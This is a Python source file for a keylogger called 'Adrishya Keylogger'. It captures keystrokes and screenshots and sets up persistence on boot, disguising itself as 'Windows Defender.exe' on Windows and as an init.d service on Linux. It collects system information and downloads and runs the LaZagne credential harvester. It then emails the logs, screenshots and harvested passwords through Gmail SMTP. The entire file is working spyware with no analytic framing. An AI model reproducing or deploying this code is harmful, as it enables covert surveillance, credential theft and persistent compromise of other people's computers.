try:
    import smtplib
    import os
    import pynput.keyboard
    import threading
    import pyscreenshot
    import imghdr
    import socket
    import platform
    import subprocess
    import tempfile
    import shutil
    import sys
    import requests
    from email.message import EmailMessage
except ModuleNotFoundError:
    import subprocess
    modules = ["pyscreenshot","pynput","requests","pytest-shutil"]
    subprocess.call("pip install " + ' '.join(modules), shell=True)


class Keylogger:

    def __init__(self, time_interval, email, password):
        self.persistent()
        self.log="Keylogger started !!!"
        self.interval=time_interval
        self.email=email
        self.password=password
 
    def persistent(self):
        if os.name!='nt':
            file_location2 = "/etc/init.d/sysconfig"
            if not os.path.exists(file_location2):
                shutil.copyfile(sys.executable, file_location2) 
                subprocess.call('sudo chmod +x /etc/init.d/sysconfig', shell=True)
                subprocess.call('sudo update-rc.d sysconfig defaults', shell=True)
                subprocess.call('sudo update-rc.d sysconfig enable', shell=True)
        else:
            file_location = os.environ["appdata"] + "\\Windows Defender.exe"
            if not os.path.exists(file_location):
                shutil.copyfile(sys.executable, file_location)
                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_location + '"', shell=True)
        
    def append_to_log(self,string):
        self.log=self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key==key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " " 
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log= ""
        if os.name!='nt':
            temp_dir=tempfile.gettempdir()
            os.chdir(temp_dir)   
            os.remove("tmp.png")
        else:
            temp_dir=tempfile.gettempdir()
            os.chdir(temp_dir)   
            os.remove("tmp.png")
            
        
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    
    def screenshot(self):
        temp_dir=tempfile.gettempdir()
        os.chdir(temp_dir)    
        img = pyscreenshot.grab()
        img.save("tmp.png")
        timerscr = threading.Timer(self.interval, self.screenshot)
        timerscr.start()

    def straler(self):

        def download(url):
            get_response=requests.get(url)
            file_name=url.split("/")[-1]
            with open(file_name,"wb") as out_file:
                out_file.write(get_response.content)

        def send_mail2(email,password,message):
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email,password)
            server.sendmail(email,email,message)
            server.quit()

        if os.name!='nt':
            temp_dir=tempfile.gettempdir()
            os.chdir(temp_dir)
            download("https://github.com/AlessandroZ/LaZagne/archive/refs/tags/2.4.3.zip")
            subprocess.call("apt-get install unzip",shell=True)
            subprocess.call("unzip 2.4.3.zip",shell=True)
            command = "python3 LaZagne-2.4.3/Linux/laZagne.py all -vv"
            results = subprocess.check_output(command, shell=True)

            send_mail2("exampleLKJH@gmail.com","passwordVerySecure",results)
            subprocess.call("rm 2.4.3.zip",shell=True)
            subprocess.call("rm -r LaZagne-2.4.3",shell=True)

                    
        else:      
            temp_dir=tempfile.gettempdir()
            os.chdir(temp_dir)      
            download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")

            command = "lazagne.exe all -vv"
            results = subprocess.check_output(command, shell=True)

            send_mail2("exampleLKJH@gmail.com","passwordVerySecure",results)
            os.remove("lazagne.exe")

    def send_mail(self,email,password,message):
        
        try:
            temp_dir=tempfile.gettempdir()
            os.chdir(temp_dir)  

            Sender_Email = email
            Reciever_Email = email
            Password = password

            newMessage = EmailMessage()                         
            newMessage['Subject'] = "Adrishya Keylogger Report" 
            newMessage['From'] = Sender_Email                   
            newMessage['To'] = Reciever_Email                   
            newMessage.set_content(message) 
            
            with open('tmp.png', 'rb') as f:
                image_data = f.read()
                image_type = imghdr.what(f.name)
                image_name = f.name

            newMessage.add_attachment(image_data, maintype='image', subtype=image_type, filename=image_name)

            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                
                smtp.login(Sender_Email, Password)              
                smtp.send_message(newMessage)

        except:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email,password)
            server.sendmail(email,email,message)
            server.quit()

    def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.append_to_log("\n" +"Hostname = " + hostname + "\n")
            self.append_to_log("IP Address = " + ip + "\n")
            self.append_to_log("Plat(processor) = " + plat + "\n")
            self.append_to_log("System = " + system + "\n")
            self.append_to_log("Mashine = " + machine + "\n")

    def start(self):
        keybord_listner=pynput.keyboard.Listener(on_press=self.process_key_press)
        with keybord_listner:
            self.screenshot()
            self.system_information()
            self.straler()
            self.report()
            keybord_listner.join()

my_keylogger=Keylogger(238, "exampleLKJH@gmail.com", "passwordVerySecure")

my_keylogger.start()
